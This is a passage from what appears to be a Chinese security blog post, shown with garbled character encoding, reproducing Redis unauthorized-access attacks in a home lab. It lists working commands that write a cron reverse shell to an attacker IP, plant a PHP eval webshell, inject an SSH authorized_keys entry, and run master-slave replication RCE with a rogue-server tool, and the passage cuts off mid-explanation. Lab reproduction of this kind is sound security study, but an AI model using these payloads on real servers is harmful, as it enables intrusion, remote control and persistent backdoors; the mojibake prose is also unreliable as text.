title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p><strong>æ¼æ´ç¯å¢ƒæ­å»º</strong></p><p>è¿™é‡Œæˆ‘çš„å—å®³æœºæ˜¯ubuntuï¼Œæ”»å‡»æœºæ˜¯kali</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.ç›´æ¥å®‰è£…redis<br>sudo apt install redis<br><br>2.å…³é—­ä¸€ä¸‹é˜²ç«å¢™<br>iptables -F<br><br>3.å°†bindçš„ç»‘å®šåœ°å€è®¾å®šä¸º0.0.0.0å¯ä»¥ä½¿å…¶æš´éœ²åœ¨å…¬ç½‘ä¸Šé¢<br>bind 0.0.0.0<br><br>4.é‡å¯ä¸€ä¸‹redisæœåŠ¡<br>systemctl restart redis<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705648.png" alt="image-20240330125500798"></p><p><strong>ç„¶åç›´æ¥æ¼æ´åˆ©ç”¨å³å¯</strong></p><p>åœ¨æ”»å‡»æœºä¸Šç”¨redis-cliè¿æ¥å³å¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">redis-cli -h &lt;å—å®³æœºçš„IP&gt; -p 6379<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705649.png" alt="image-20240330125617710"></p><p>ä¸‹é¢å°±æ˜¯ä¸€äº›åˆ©ç”¨è¯¥æ¼æ´æ‰€è¿›è¡Œçš„è¿›ä¸€æ­¥æ”»å‡»æ“ä½œ</p><h1 id="å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell</h1><p><strong>è®¡åˆ’ä»»åŠ¡ç›¸å…³æ–‡ä»¶çš„ç²—æ”¾ä½ç½®</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">/etc/crontabï¼šè¿™æ˜¯ç³»ç»ŸèŒƒå›´çš„ cron é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«äº†ç³»ç»Ÿçº§åˆ«çš„è®¡åˆ’ä»»åŠ¡çš„è®¾ç½®ã€‚<br><br>/etc/cron.d/ï¼šè¿™ä¸ªç›®å½•ç”¨äºå­˜æ”¾ç³»ç»Ÿçº§åˆ«çš„ cron ä»»åŠ¡é…ç½®æ–‡ä»¶ã€‚<br><br>/etc/cron.daily/ï¼šè¯¥ç›®å½•åŒ…å«äº†æ¯æ—¥æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡ã€‚<br><br>/etc/cron.weekly/ï¼šè¿™ä¸ªç›®å½•ç”¨äºå­˜æ”¾æ¯å‘¨æ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡ã€‚<br><br>/etc/cron.monthly/ï¼šåŒ…å«äº†æ¯æœˆæ‰§è¡Œçš„è®¡åˆ’ä»»åŠ¡ã€‚<br><br>/var/spool/cron/ æˆ– /var/spool/cron/crontabs/ï¼šè¿™ä¸ªç›®å½•é€šå¸¸åŒ…å«ç”¨æˆ·ç‰¹å®šçš„ crontab æ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­å®šä¹‰è‡ªå·±çš„è®¡åˆ’ä»»åŠ¡ã€‚<br><br>ç”¨æˆ·å®¶ç›®å½•ä¸‹çš„ .crontab æˆ– .cronjobsï¼šç”¨æˆ·å¯ä»¥åœ¨è‡ªå·±çš„å®¶ç›®å½•ä¸‹åˆ›å»ºåä¸º .crontab æˆ– .cronjobs çš„æ–‡ä»¶ï¼Œä»¥å®šä¹‰è‡ªå·±çš„è®¡åˆ’ä»»åŠ¡ã€‚<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå†äº†è§£ä¸€ä¸‹è®¡åˆ’ä»»åŠ¡çš„å†™å…¥å½¢å¼ï¼Œå½“æˆ‘ä»¬crontab -eå†™å…¥è®¡åˆ’ä»»åŠ¡çš„æ—¶å€™ï¼Œä¼šåœ¨è®¡åˆ’ä»»åŠ¡çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªä»¥ç”¨æˆ·åå‘½åçš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬ç­‰ä¼šrediså†™å…¥æ–‡ä»¶æ—¶ä¿å­˜çš„æ–‡ä»¶åä¹Ÿè¦æ˜¯ä»¥ç”¨æˆ·åå‘½åçš„æ–‡ä»¶</p><p><img src="http://cdn.clown2024.cn/202407151705650.png" alt="image-20240330132520323"></p><p><img src="http://cdn.clown2024.cn/202407151705651.png" alt="image-20240330132538445"></p><p><strong>å†™å…¥è®¡åˆ’ä»»åŠ¡</strong></p><p>åˆ©ç”¨æ€è·¯ï¼š</p><p>æˆ‘ä»¬è¿æ¥ä¹‹åå°±è¦åˆ©ç”¨configä¿®æ”¹æ–‡ä»¶çš„ä¿å­˜è·¯å¾„ä¸ºè®¡åˆ’ä»»åŠ¡çš„è·¯å¾„ï¼Œç„¶åå†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆemmmå†™å…¥å¤±è´¥äº†ï¼Œè¯´æƒé™ä¸å¤Ÿï¼Œå¯èƒ½æ˜¯ubuntuç”¨äº†æ™®é€šç”¨æˆ·å¯åŠ¨redisï¼Œä½†æ˜¯Ubuntuæ¢rootç™»å½•åˆè¦æŠ˜è…¾ï¼Œæˆ‘è¿™é‡Œç›´æ¥æ¢centosäº†ï¼‰</p><p>&#x3D;&#x3D;centoså®‰è£…redis&#x3D;&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs shelll">yum update #æ›´æ–°å®‰è£…åŒ…<br>yum install epel-release # å®‰è£… EPEL è½¯ä»¶åº“ï¼šRedis è½¯ä»¶åŒ…é€šå¸¸åœ¨ EPEL è½¯ä»¶åº“ä¸­<br>yum install redis<br>sudo systemctl start redis #å¯åŠ¨redisæœåŠ¡<br>sudo systemctl enable redis # ç”¨äºè®¾ç½®å¼€æœºè‡ªå¯åŠ¨ï¼Œçœ‹éœ€æ±‚é€‰æ‹©<br></code></pre></td></tr></table></figure><p>ç„¶åå’Œä¸Šé¢ä¸€æ ·ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œcentosçš„redisé…ç½®æ–‡ä»¶çš„è·¯å¾„ä¸º&#x2F;etc&#x2F;redis.conf</p><p>ç„¶åå†å…³ä¸€ä¸‹é˜²ç«å¢™</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">iptables -F<br>setenforce 0  # æ”¹å˜SELinuxçš„å·¥ä½œæ¨¡å¼ï¼ŒSELinuxæ˜¯ä¸€ç§åœ¨ Linux æ“ä½œç³»ç»Ÿä¸Šå®ç°å¼ºåˆ¶è®¿é—®æ§åˆ¶ï¼ˆMACï¼‰çš„å®‰å…¨æœºåˆ¶ï¼›<br>systemctl stop firewalld.service #centosä¸­ç‰¹æœ‰çš„é˜²ç«å¢™<br></code></pre></td></tr></table></figure><blockquote><p>SELinuxæœ‰ä¸‰ç§å·¥ä½œæ¨¡å¼ï¼š</p><ol><li>Enforcing Modeï¼ˆå¼ºåˆ¶æ¨¡å¼ï¼‰ï¼šåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼ŒSELinuxä¼šå¼ºåˆ¶æ‰§è¡Œæ‰€æœ‰å®šä¹‰çš„å®‰å…¨ç­–ç•¥ï¼Œå¦‚æœæœ‰è¿åç­–ç•¥çš„æ“ä½œå‘ç”Ÿï¼Œä¼šè¢«é˜»æ­¢å¹¶è®°å½•åˆ°æ—¥å¿—ä¸­ã€‚åœ¨å¼ºåˆ¶æ¨¡å¼ä¸‹ï¼ŒSELinuxä¼šä¸¥æ ¼é™åˆ¶ç³»ç»Ÿèµ„æºçš„è®¿é—®ã€‚è¡¨ç¤ºä¸º1</li><li>Permissive Modeï¼ˆå®½å®¹æ¨¡å¼ï¼‰ï¼šåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼ŒSELinuxä¼šè®°å½•è¿åå®‰å…¨ç­–ç•¥çš„æ“ä½œï¼Œä½†ä¸ä¼šé˜»æ­¢å®ƒä»¬ï¼Œè¿™æ ·å¯ä»¥å¸®åŠ©ç®¡ç†å‘˜äº†è§£å“ªäº›æ“ä½œå¯èƒ½ä¼šè¿åç­–ç•¥ã€‚è¿™ä¸ªæ¨¡å¼ç±»ä¼¼äºç›‘æ§æ¨¡å¼ã€‚è¡¨ç¤ºä¸º0</li><li>Disabled Modeï¼ˆç¦ç”¨æ¨¡å¼ï¼‰ï¼šåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼ŒSELinuxå®Œå…¨è¢«ç¦ç”¨ï¼Œç³»ç»Ÿä¸ä¼šåº”ç”¨ä»»ä½•SELinuxçš„å®‰å…¨ç­–ç•¥ã€‚è¦è®¾ç½®å…³é—­çš„è¯å°±éœ€è¦ä¿®æ”¹â€&#x2F;etc&#x2F;sysconfig&#x2F;selinuxâ€é…ç½®æ–‡ä»¶</li></ol><p>å¯ä»¥ä½¿ç”¨getenforceæŸ¥çœ‹å½“å‰å·¥ä½œæ¨¡å¼</p><p><img src="http://cdn.clown2024.cn/202407151705652.png" alt="image-20240330141233651"></p></blockquote><blockquote><p>åˆå†™ä¸è¿›å»è¿˜æ˜¯ä¼šæŠ¥ä¸‹é¢çš„é”™æˆ‘å°±å¥‡æ€ªäº†</p><p><img src="http://cdn.clown2024.cn/202407151705653.png" alt="image-20240330143126682"></p><p>å»æœäº†æœå‘ç°å³ä½¿ä¸ºrootèº«ä»½ï¼Œredisä»–è‡ªå·±ä¹Ÿä¸æ˜¯ä»¥rootèº«ä»½ç™»å½•çš„ï¼Œè¦ä»é…ç½®æ–‡ä»¶å¯åŠ¨æ‰èƒ½ä»¥rootèº«ä»½ç™»å½•ï¼Œå‘æ­»äº†ï¼Œæ‰€ä»¥è¦å…ˆsystemctl stop redisæ¥åœæ‰redisæœåŠ¡ï¼Œè¦æˆ‘ä»¬æ¥è‡ªå·±å¯åŠ¨</p><p>&#x2F;usr&#x2F;bin&#x2F;redis-server &#x2F;etc&#x2F;redis.conf  &#x2F;&#x2F;ç›´æ¥redis-serverå¯åŠ¨ä¼šå¼€å¯ä¿æŠ¤æ¨¡å¼ä¹Ÿæ”¹ä¸äº†ç›®å½•</p><p><img src="http://cdn.clown2024.cn/202407151705654.png" alt="image-20240330143530956"></p><p>ç„¶åç»ˆäºå¯ä»¥æ„‰å¿«åœ°å†™è®¡åˆ’ä»»åŠ¡äº†</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /var/spool/cron   #è¿™ä¸ªè¦çœ‹å…·ä½“ç³»ç»Ÿçš„ç›®å½•<br>config set dbfilename root<br>set xxoo &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/&lt;æ”»å‡»è€…ip&gt;/&lt;ç›‘å¬ç«¯å£&gt; 0&gt;&amp;1\n\n&quot; #è¿™é‡Œçš„æ¢è¡Œæ˜¯ä¸ºäº†ä¿è¯æ ¼å¼æ­£ç¡®ï¼Œå¦‚æœç›®æ ‡æœºå™¨ä¸Šæœ‰å¾ˆå¤šçš„è®¡åˆ’ä»»åŠ¡å¯èƒ½ä¼šå¯¼è‡´å†™å…¥çš„åå¼¹sehllæ ¼å¼é”™è¯¯ã€‚<br>save  #è¿›è¡Œä¸€æ¬¡å¤‡ä»½æ¥å†™å…¥æ–‡ä»¶å½“ä¸­<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705655.png" alt="image-20240330143734305"></p><p>ç„¶å<strong>nc -lvvp 6666</strong>å¼€å¯ç›‘å¬ç­‰å¾…å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151705656.png" alt="image-20240330144612655"></p><p>åå¼¹shellæˆåŠŸï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘ä»¬å†™è¿›å»çš„è®¡åˆ’ä»»åŠ¡é•¿ä»€ä¹ˆæ ·</p><p><img src="http://cdn.clown2024.cn/202407151705657.png" alt="image-20240330144654223"></p><p>è¿™ä¸ªæ–¹æ³•åªèƒ½<code>Centos</code>ä¸Šä½¿ç”¨ï¼Œ<code>Ubuntuä¸Š</code>è¡Œä¸é€šï¼ŒåŸå› å¦‚ä¸‹ï¼š</p><ol><li>å› ä¸ºé»˜è®¤rediså†™æ–‡ä»¶åæ˜¯644çš„æƒé™ï¼Œä½†ubuntuè¦æ±‚æ‰§è¡Œå®šæ—¶ä»»åŠ¡æ–‡ä»¶<code>/var/spool/cron/crontabs/&lt;username&gt;</code>æƒé™å¿…é¡»æ˜¯600ä¹Ÿå°±æ˜¯<code>-rw-------</code>æ‰ä¼šæ‰§è¡Œï¼Œå¦åˆ™ä¼šæŠ¥é”™<code>(root) INSECURE MODE (mode 0600 expected)</code>ï¼Œè€ŒCentosçš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶<code>/var/spool/cron/&lt;username&gt;</code>æƒé™644ä¹Ÿèƒ½æ‰§è¡Œ</li><li>å› ä¸ºredisä¿å­˜RDBä¼šå­˜åœ¨ä¹±ç ï¼Œåœ¨Ubuntuä¸Šä¼šæŠ¥é”™ï¼Œè€Œåœ¨Centosä¸Šä¸ä¼šæŠ¥é”™</li></ol><h1 id="å†™å…¥webshellæ§åˆ¶æœåŠ¡å™¨"><a href="#å†™å…¥webshellæ§åˆ¶æœåŠ¡å™¨" class="headerlink" title="å†™å…¥webshellæ§åˆ¶æœåŠ¡å™¨"></a>å†™å…¥webshellæ§åˆ¶æœåŠ¡å™¨</h1><ol><li>è¿™é‡Œæˆ‘ä»¬å…ˆç”¨centoså¿«é€Ÿæ­å»ºä¸€ä¸ªLAMPçš„ç¯å¢ƒç”¨äºè§£ææˆ‘ä»¬ä¸Šä¼ çš„phpä¸€å¥è¯æœ¨é©¬</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">å®‰è£…apacheæœåŠ¡å™¨</span><br>sudo yum install httpd<br>sudo systemctl start httpd<br>sudo systemctl enable httpd<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å®‰è£…mysqlæ•°æ®åº“</span><br>sudo yum install mysql mysql-server<br>sudo systemctl start mysqld<br>sudo systemctl enable mysqld<br>sudo mysql_secure_installation # MySQL æä¾›çš„å®ç”¨å·¥å…·ï¼Œç”¨äºæ‰§è¡Œä¸€äº›å®‰å…¨è®¾ç½®å’Œé…ç½®ä»¥åŠ å›º MySQL æ•°æ®åº“çš„å®‰å…¨æ€§<br><span class="hljs-meta prompt_"># </span><span class="language-bash">å®‰è£…php</span><br>sudo yum install php php-mysql<br></code></pre></td></tr></table></figure><ol start="2"><li>å¼€å§‹å†™å…¥æˆ‘ä»¬çš„webshell</li></ol><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /var/www/html<br>config set dbfilename shell.php<br>set shell &quot;&lt;?php eval($_POST[shell])?&gt;&quot;<br>save<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705658.png" alt="image-20240330150154116"></p><p>ç„¶åæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹shell.php</p><p><img src="http://cdn.clown2024.cn/202407151705659.png" alt="image-20240330150249714"></p><p>ä¸Šé¢çš„å†…å®¹æ˜¯æˆ‘ä»¬ä¸Šæ¬¡è®¾ç½®çš„å®šæ—¶ä»»åŠ¡æ•°æ®ï¼Œä¸€èµ·saveäº†è¿›å»ï¼Œæ¥ä¸‹æ¥ç”¨èšå‰‘å»è¿æ¥ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151705660.png" alt="image-20240330150436847"></p><p>è¿æ¥æˆåŠŸå¯ä»¥çœ‹åˆ°ç›®å½•ä¸‹çš„æ–‡ä»¶</p><h1 id="å†™å…¥ssh-keygenå…¬é’¥ç™»å½•æœåŠ¡å™¨æ¼æ´"><a href="#å†™å…¥ssh-keygenå…¬é’¥ç™»å½•æœåŠ¡å™¨æ¼æ´" class="headerlink" title="å†™å…¥ssh-keygenå…¬é’¥ç™»å½•æœåŠ¡å™¨æ¼æ´"></a>å†™å…¥ssh-keygenå…¬é’¥ç™»å½•æœåŠ¡å™¨æ¼æ´</h1><p>SSHæä¾›ä¸¤ç§ç™»å½•éªŒè¯æ–¹å¼ï¼Œä¸€ç§æ˜¯å£ä»¤éªŒè¯ä¹Ÿå°±æ˜¯è´¦å·å¯†ç ç™»å½•ï¼Œå¦ä¸€ç§æ˜¯å¯†é’¥éªŒè¯ã€‚</p><p>å¯†é’¥éªŒè¯å°±æ˜¯ä¸€ç§åŸºäºå…¬é’¥å¯†ç çš„è®¤è¯ï¼Œä½¿ç”¨å…¬é’¥åŠ å¯†ã€ç§é’¥è§£å¯†ï¼Œå…¶ä¸­å…¬é’¥æ˜¯å¯ä»¥å…¬å¼€çš„ï¼Œæ”¾åœ¨æœåŠ¡å™¨ç«¯ï¼Œä½ å¯ä»¥æŠŠåŒä¸€ä¸ªå…¬é’¥æ”¾åœ¨æ‰€æœ‰ä½ æƒ³SSHè¿œç¨‹ç™»å½•çš„æœåŠ¡å™¨ä¸­ï¼Œè€Œç§é’¥æ˜¯ä¿å¯†çš„åªæœ‰ä½ è‡ªå·±çŸ¥é“ï¼Œå…¬é’¥åŠ å¯†çš„æ¶ˆæ¯åªæœ‰ç§é’¥æ‰èƒ½è§£å¯†ï¼Œå¤§ä½“è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ol><li>å®¢æˆ·ç«¯ç”Ÿæˆç§é’¥å’Œå…¬é’¥ï¼Œå°†å…¬é’¥æ‹·è´ç»™æœåŠ¡å™¨ç«¯</li><li>å®¢æˆ·ç«¯å‘èµ·ç™»å½•è¯·æ±‚</li><li>æœåŠ¡å™¨ç«¯æ ¹æ®å®¢æˆ·ç«¯å‘æ¥çš„ä¿¡æ¯æŸ¥æ‰¾æ˜¯å¦å­˜æœ‰è¯¥å®¢æˆ·ç«¯çš„å…¬é’¥ï¼Œ</li><li>å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨å‘æ¥çš„åŠ å¯†åçš„æ¶ˆæ¯åä½¿ç”¨ç§é’¥è§£å¯†ï¼Œå¹¶æŠŠè§£å¯†åçš„ç»“æœå‘ç»™æœåŠ¡å™¨ç”¨äºéªŒè¯</li><li>æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥çš„è§£å¯†ç»“æœï¼Œä¸è‡ªå·±åˆšæ‰ç”Ÿæˆçš„éšæœºæ•°æ¯”å¯¹</li></ol><p><strong>æ”»å‡»è€…æœ¬åœ°ç”Ÿæˆå¯†é’¥å¯¹</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh-keygen -t rsa  # åœ¨å®¶ç›®å½•çš„.sshä¸‹è¿›è¡Œç”Ÿæˆ<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705661.png" alt="image-20240330151056696"></p><p><strong>å‘å—å®³è€…æœºå™¨å†™å…¥å…¬é’¥</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">config set dir /root/.ssh<br>config set dbfilename authorized_keys<br>set x &quot;\n\n\n&lt;ç”Ÿæˆçš„å…¬é’¥&gt;\n\n\n&quot;  #æ¢è¡Œæ˜¯ä¸ºäº†é¿å…å’Œå…¶ä»–æ•°æ®æ··åˆä¿è¯æ ¼å¼æ­£ç¡®ï¼Œå’Œä¸Šé¢çš„è®¡åˆ’ä»»åŠ¡ä¸€æ ·<br>save<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705662.png" alt="image-20240330151540903"></p><p>ç„¶åä½¿ç”¨sshç™»å½•ç›®æ ‡æœºå™¨ï¼Œåœ¨.sshç›®å½•ä¸‹ç”¨ç§é’¥ç™»å½•</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh -i id_rsa root@&lt;ç›®æ ‡æœºå™¨ip&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705663.png" alt="image-20240330151831267"></p><p>æˆåŠŸç™»å½•ï¼</p><h1 id="ä¸»ä»å¤åˆ¶rce"><a href="#ä¸»ä»å¤åˆ¶RCE" class="headerlink" title="ä¸»ä»å¤åˆ¶RCE"></a>ä¸»ä»å¤åˆ¶RCE</h1><p><strong>ä¸»ä»å¤åˆ¶ä»‹ç»</strong></p><p>ä¸»ä»å¤åˆ¶çš„ä¼ è¾“åˆ†ä¸ºå…¨é‡ä¼ è¾“å’Œå¢é‡ä¼ è¾“ï¼Œè¿™é‡Œçš„é‡ç‚¹æ˜¯å…¨é‡ä¼ è¾“ï¼šå…¨é‡ä¼ è¾“æ˜¯å°†æ•°æ®åº“å¤‡ä»½æ–‡ä»¶æ•´ä¸ªä¼ è¾“è¿‡å»ï¼Œç„¶åä»èŠ‚ç‚¹æ¸…ç©ºå†…å­˜æ•°æ®åº“ï¼Œå°†å¤‡ä»½æ–‡ä»¶åŠ è½½åˆ°æ•°æ®åº“ä¸­ã€‚</p><p>è¿™é‡Œä»åˆ«äººçš„æ–‡ç« å·ä¸ªæµç¨‹å›¾æ–¹ä¾¿ç†è§£ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151705664.png" alt="image-20240330225328187"></p><p><strong>æ¼æ´åŸç†</strong></p><p>æ¼æ´å­˜åœ¨äº4.xã€5.xç‰ˆæœ¬ä¸­ï¼ŒRedisæä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼æŒ‡ä½¿ç”¨ä¸€ä¸ªredisä½œä¸ºä¸»æœºï¼Œå…¶ä»–çš„ä½œä¸ºå¤‡ä»½æœºï¼Œä¸»æœºä»æœºæ•°æ®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä»æœºè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚åœ¨redis4.xä¹‹åï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•å¯ä»¥å®ç°åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤,é€šè¿‡å†™cè¯­è¨€å¹¶ç¼–è¯‘å‡º,soæ–‡ä»¶ã€‚åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNGåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½æ¶æ„soæ–‡ä»¶ï¼Œå³å¯æ‰§è¡Œå‘½ä»¤ã€‚</p><blockquote><p>å› ä¸ºrediså¯ä»¥åŠ è½½å¤–éƒ¨æ¨¡å—ï¼Œè€Œå¤–éƒ¨æ¨¡å—éƒ½æ˜¯soæ–‡ä»¶çš„å½¢å¼ï¼Œå¯ä»¥ä½¿ç”¨ç¼–è¾‘redisé…ç½®æ–‡ä»¶çš„æ–¹å¼æ¥åŠ è½½æ¨¡å—ï¼Œæ–‡ä»¶é‡Œé¢ä¹Ÿç»™äº†æˆ‘ä»¬ç¤ºä¾‹</p><p><img src="http://cdn.clown2024.cn/202407151705665.png" alt="image-20240330170245773"></p></blockquote><p><strong>æ¼æ´åˆ©ç”¨</strong></p><p>æ¼æ´åˆ©ç”¨æˆ‘ä»¬éœ€è¦ç”¨åˆ°ä¸‹é¢çš„ä¸¤ä¸ªå·¥å…·</p><ul><li>redis-rogue-serverï¼š<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> ï¼Œè¯¥å·¥å…·é’ˆå¯¹ç«¯å£å¼€æ”¾åœ¨å…¬ç½‘çš„redisä½¿ç”¨ï¼Œæ²¡å¼€åœ¨å…¬ç½‘å°±æ˜¯ç”¨ä¸‹é¢çš„å·¥å…·</li><li>Awsome-Redis-Rogue-Serverï¼š<a href="https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server</a></li></ul><h2 id="ä½¿ç”¨ç¬¬ä¸€ä¸ªå·¥å…·è¿œç¨‹ä¸»ä»å¤åˆ¶rce"><a href="#ä½¿ç”¨ç¬¬ä¸€ä¸ªå·¥å…·è¿œç¨‹ä¸»ä»å¤åˆ¶RCE" class="headerlink" title="ä½¿ç”¨ç¬¬ä¸€ä¸ªå·¥å…·è¿œç¨‹ä¸»ä»å¤åˆ¶RCE"></a>ä½¿ç”¨ç¬¬ä¸€ä¸ªå·¥å…·è¿œç¨‹ä¸»ä»å¤åˆ¶RCE</h2><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python3 redis-rogue-server.py --rhost  --rport  --lhost  --lport <br></code></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-â€“rpasswd å¦‚æœç›®æ ‡ Redis æœåŠ¡å¼€å¯äº†è®¤è¯åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡è¯¥é€‰é¡¹æŒ‡å®šå¯†ç (æ²¡å°è¯•è¿‡ä¸çŸ¥é“è¡Œä¸è¡Œ)<br><br>-â€“rhost ç›®æ ‡ redis æœåŠ¡ IP<br><br>-â€“rport ç›®æ ‡ redis æœåŠ¡ç«¯å£ï¼Œé»˜è®¤ä¸º 6379<br><br>-â€“lhost vps çš„ IP åœ°å€<br><br>-â€“lport vps çš„ç«¯å£ï¼Œé»˜è®¤ä¸º 21000<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151705666.png" alt="image-20240330171342499"></p><p>å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸè®¿é—®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ié€‰æ‹©ä¸€ä¸ªäº¤äº’å¼shellæˆ–è€…råå¼¹ä¸€ä¸ªshell(è¿™æ—¶å€™è¦å†å¼€å¯ä¸€ä¸ªç›‘å¬ç«¯å£)</p><p><img src="http://cdn.clown2024.cn/202407151705667.png" alt="image-20240330171502308"></p><p>emmmè¿™ä¸ªäº¤äº’å¼çš„shellå¥½åƒæœ‰ç‚¹æ‹‰ï¼Œæ¥ä¸‹æ¥æ¢åå¼¹shellè¯•è¯•ï¼Œå‘ç°å¼¹ä¸äº†å¤±è´¥äº†ï¼Œæ„Ÿè§‰æ˜¯æˆ‘æœ¬åœ°å®‰è£…çš„redisç‰ˆæœ¬è¿‡é«˜äº†ï¼Œè¿™ä¸ªè„šæœ¬çš„ä½¿ç”¨ç‰ˆæœ¬æ˜¯&lt;&#x3D;5.0.5ï¼Œç„¶åå–volfocuså¼€äº†ä¸€ä¸ª5.0ç‰ˆæœ¬çš„ç¯å¢ƒå°±æˆåŠŸäº†</p><p><img src="http://cdn.clown2024.cn/202407151705668.png" alt="image-20240330223708742"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸåå¼¹äº†ä¸€ä¸ªshellå›æ¥ï¼Œè¿™æ˜¯åæˆ‘ä»¬è¿˜å¯ä»¥ç”¨pythonæ¥ç”Ÿæˆä¸€ä¸ªäº¤äº’å¼çš„shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡å¼€çš„è¿™ä¸ªå®¹å™¨æ²¡æœ‰pythonç”Ÿæˆä¸äº†ï¼ˆ</p></blockquote><h2 id="æœ¬åœ°redisä¸»ä»å¤åˆ¶rceåå¼¹shell"><a href="#æœ¬åœ°Redisä¸»ä»å¤åˆ¶RCEåå¼¹shell" class="headerlink" title="æœ¬åœ°Redisä¸»ä»å¤åˆ¶RCEåå¼¹shell"></a>æœ¬åœ°Redisä¸»ä»å¤åˆ¶RCEåå¼¹shell</h2><p><strong>æ¼æ´åŸç†ï¼š</strong>å¯¹äºåªå…è®¸æœ¬åœ°è¿æ¥çš„RedisæœåŠ¡å™¨ï¼Œå¯ä»¥é€šè¿‡å¼€å¯ä¸»ä»æ¨¡å¼ä»è¿œç¨‹ä¸»æœºä¸ŠåŒæ­¥æ¶æ„.soæ–‡ä»¶è‡³æœ¬åœ°ï¼Œæ¥ç€è½½å…¥æ¶æ„.soæ–‡ä»¶æ¨¡å—ï¼Œåå¼¹shellè‡³è¿œç¨‹ä¸»æœºã€‚</p><p>æ­¥éª¤å¯ä»¥æ€»ç»“å¦‚ä¸‹ï¼š</p><ul><li>ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬ä¼ªè£…æˆredisæ•°æ®åº“ï¼Œç„¶åå—å®³è€…å°†æˆ‘ä»¬çš„æ•°æ®åº“è®¾ç½®ä¸ºä¸»èŠ‚ç‚¹ã€‚</li><li>ç¬¬äºŒæ­¥ï¼Œæˆ‘ä»¬è®¾ç½®å¤‡ä»½æ–‡ä»¶åä¸ºsoæ–‡ä»¶</li><li>ç¬¬ä¸‰æ­¥ï¼Œè®¾ç½®ä¼ 